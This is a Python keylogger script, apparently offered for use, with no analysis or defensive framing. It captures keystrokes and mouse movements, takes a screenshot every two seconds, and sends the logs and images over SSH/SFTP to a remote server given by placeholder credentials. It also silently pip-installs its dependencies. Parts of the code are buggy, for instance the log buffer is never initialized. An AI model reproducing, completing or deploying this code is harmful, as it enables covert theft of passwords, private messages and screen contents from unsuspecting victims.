try:
    import logging
    import os
    import platform
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard, mouse
    from pynput.keyboard import Listener as KeyboardListener
    from pynput.mouse import Listener as MouseListener
    import paramiko
    import time
    import io
    from PIL import ImageGrab
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "paramiko", "pillow"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    SEND_REPORT_EVERY = 60  # as in seconds
    SCREENSHOT_INTERVAL = 2  # interval for taking screenshots in seconds

    class KeyLogger:
        def __init__(self, ssh_host, ssh_port, ssh_username, ssh_password):
            self.ssh_host = ssh_host
            self.ssh_port = ssh_port
            self.ssh_username = ssh_username
            self.ssh_password = ssh_password
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(hostname=self.ssh_host, port=self.ssh_port, username=self.ssh_username,
                                     password=self.ssh_password)
            self.keyboard_listener = KeyboardListener(on_press=self.save_data)
            self.mouse_listener = MouseListener(on_move=self.on_move)
            self.screenshot_timer = None

        def on_move(self, x, y):
            self.appendlog(f"Mouse moved to ({x}, {y})\n")

        def on_click(self, x, y, button, pressed):
            self.appendlog(f"Mouse {'Pressed' if pressed else 'Released'} at ({x}, {y})\n")

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def appendlog(self, string):
            with self.lock:
                self.log += string

        def send_report_via_ssh(self):
            try:
                with self.lock:
                    stdin, stdout, stderr = self.ssh_client.exec_command("echo '" + self.log + "' >> keylogger_report.txt")
                self.log = ""
            except Exception as e:
                print("Error:", e)

        def take_screenshot(self):
            try:
                with ImageGrab.grab() as img:
                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG")
                    buffer.seek(0)
                    ftp_client = self.ssh_client.open_sftp()
                    with ftp_client.file("screenshot.jpg", "wb") as f:
                        f.write(buffer.read())
                    ftp_client.close()
            except Exception as e:
                print("Error capturing screenshot:", e)

            self.screenshot_timer = threading.Timer(SCREENSHOT_INTERVAL, self.take_screenshot)
            self.screenshot_timer.start()

        def start(self):
            self.lock = threading.Lock()
            self.keyboard_listener.start()
            self.mouse_listener.start()
            self.take_screenshot()

        def stop(self):
            self.keyboard_listener.stop()
            self.mouse_listener.stop()
            if self.screenshot_timer:
                self.screenshot_timer.cancel()
            self.send_report_via_ssh()
            self.ssh_client.close()

    ssh_host = "YOUR_SSH_HOST"
    ssh_port = "YOUR_SSH_PORT"
    ssh_username = "YOUR_SSH_USERNAME"
    ssh_password = "YOUR_SSH_PASSWORD"

    keylogger = KeyLogger(ssh_host, ssh_port, ssh_username, ssh_password)
    keylogger.start()
